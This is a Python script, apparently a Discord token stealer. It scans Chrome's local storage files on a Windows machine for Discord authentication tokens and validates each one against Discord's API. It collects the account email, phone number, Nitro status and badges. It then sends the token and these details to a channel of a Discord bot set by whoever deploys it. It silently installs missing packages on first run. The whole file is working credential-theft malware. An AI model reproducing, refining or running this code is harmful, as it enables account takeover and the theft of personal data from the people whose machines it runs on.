try:
    import discord
    import aiohttp
except ImportError:
    import subprocess
    import sys
    subprocess.check_call([sys.executable, "-m", "pip", "install", "discord.py", "aiohttp"])
    import discord
    import aiohttp

import os
import re
import typing

DISCORD_BOT_TOKEN = "123" #bot token (not webhook)
CHANNEL_ID = 123 #channel id

TOKEN_REGEX_PATTERN = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{34,38}"

NITRO_MAP = {
    0: "None",
    1: "Nitro Classic",
    2: "Nitro",
}

BADGES_MAP = {
    1 << 0: "Discord Employee",
    1 << 1: "Partnered Server Owner",
    1 << 2: "HypeSquad Events",
    1 << 3: "Bug Hunter Level 1",
    1 << 6: "House Bravery",
    1 << 7: "House Brilliance",
    1 << 8: "House Balance",
    1 << 9: "Early Supporter",
    1 << 14: "Bug Hunter Level 2",
    1 << 17: "Verified Bot Developer",
}

def get_tokens_from_file(file_path: str) -> typing.Union[list[str], None]:
    try:
        with open(file_path, encoding="utf-8", errors="ignore") as f:
            contents = f.read()
    except PermissionError:
        return None
    return re.findall(TOKEN_REGEX_PATTERN, contents)

def get_tokens_from_path(base_path: str) -> typing.List[str]:
    all_tokens = []
    for file in os.listdir(base_path):
        full_path = os.path.join(base_path, file)
        tokens = get_tokens_from_file(full_path)
        if tokens:
            all_tokens.extend(tokens)
    return list(set(all_tokens))

async def get_user_info(token: str) -> typing.Optional[dict]:
    url = "https://discord.com/api/v10/users/@me"
    headers = {"Authorization": token}
    async with aiohttp.ClientSession() as session:
        async with session.get(url, headers=headers) as resp:
            if resp.status == 200:
                data = await resp.json()
                return data
    return None

def parse_badges(flags: int) -> str:
    badges = [name for bit, name in BADGES_MAP.items() if flags & bit]
    return ", ".join(badges) if badges else "None"

class TokenBot(discord.Client):
    async def on_ready(self):
        chrome_path = os.path.join(
            os.getenv("LOCALAPPDATA"),
            r"Google\Chrome\User Data\Default\Local Storage\leveldb"
        )
        tokens = get_tokens_from_path(chrome_path)
        if not tokens:
            return
        for token in tokens:
            user_info = await get_user_info(token)
            if not user_info:
                continue
            username = f"{user_info['username']}#{user_info['discriminator']}"
            user_id = user_info['id']
            email = user_info.get('email', "N/A")
            phone = user_info.get('phone') or "N/A"
            nitro_status = NITRO_MAP.get(user_info.get('premium_type', 0), "None")
            badges = parse_badges(user_info.get('public_flags', 0))

            embed = discord.Embed(
                title=f"{username} | {user_id}",
                color=0x29c6ff
            )
            embed.add_field(
                name="**Main Info**",
                value=f"Email: **{email}**\nPhone: **{phone}**",
                inline=True
            )
            embed.add_field(
                name="**Discord Info**",
                value=f"Nitro: **{nitro_status}**\nBadges: **{badges}**",
                inline=True
            )
            embed.add_field(
                name="**Token**",
                value=f"```fix\n{token}```",
                inline=False
            )
            embed.set_footer(text="• made by @euras24 💤 https://github.com/euras24 •")
            channel = self.get_channel(CHANNEL_ID)
            if channel:
                await channel.send(embed=embed)
                await self.close()

intents = discord.Intents.default()
client = TokenBot(intents=intents)
client.run(DISCORD_BOT_TOKEN)
